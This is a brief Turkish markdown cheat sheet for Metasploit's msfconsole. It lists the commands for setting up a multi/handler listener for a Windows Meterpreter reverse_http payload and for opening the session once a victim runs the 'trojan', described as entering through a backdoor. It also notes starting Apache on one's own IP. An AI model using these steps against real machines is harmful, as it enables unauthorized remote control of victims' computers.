# MSFCONSOLE

#### 1.```msfconsole``` 
#### 2.```use exploit/multi/handler``` diyerek payload tanımlıyoruz
#### 3.```set patload windows/meterpreter/reverse_http```  (trojanın oluşturulma tipine göre değişiklik gösterebilir)
#### 4.```LHOST ve LPORT```'u değiştiriyoruz
#### 5.```exploit -j -z``` ile dinlemeye başlıyoruz 
#### 6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz
---
### ```service apache2 start/stop``` Kendi IP'mizin Web servisini aktif hale getirir
